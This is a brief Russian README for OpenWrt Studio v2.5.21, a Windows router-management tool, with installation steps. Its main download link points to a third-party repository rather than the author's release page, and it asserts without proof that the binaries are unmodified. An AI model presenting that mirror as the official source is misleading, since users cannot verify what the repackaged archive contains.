# OpenWrt Studio

Программа управления роутерами OpenWrt для Windows.

- Автор/сопровождение: [RichkovGit](https://github.com/RichkovGit).
- Версия: **v2.5.21**.
- Платформы: Windows x64.
- [Исходники и полная инструкция](https://github.com/RichkovGit/OpenWrtStudio).
- [Оригинальный релиз](https://github.com/RichkovGit/OpenWrtStudio/releases/tag/v2.5.21).
- [Скачать единый архив OpenWrtStudio_RichkovGit.zip](https://github.com/murk-sus/holy-videcode-project/releases/download/RichkovGit/openwrtstudio/OpenWrtStudio_RichkovGit.zip).

## Установка

Windows: запустите установщик Setup либо распакуйте Portable.zip целиком и запустите EXE.

Бинарные файлы взяты из указанного опубликованного релиза без изменений; подписи APK сохранены. В архиве есть README.txt с версией, инструкцией и ссылками. Лицензии и сведения об исходных авторах доступны в исходном репозитории. APK в проекте LuCI не являются приложениями Android.
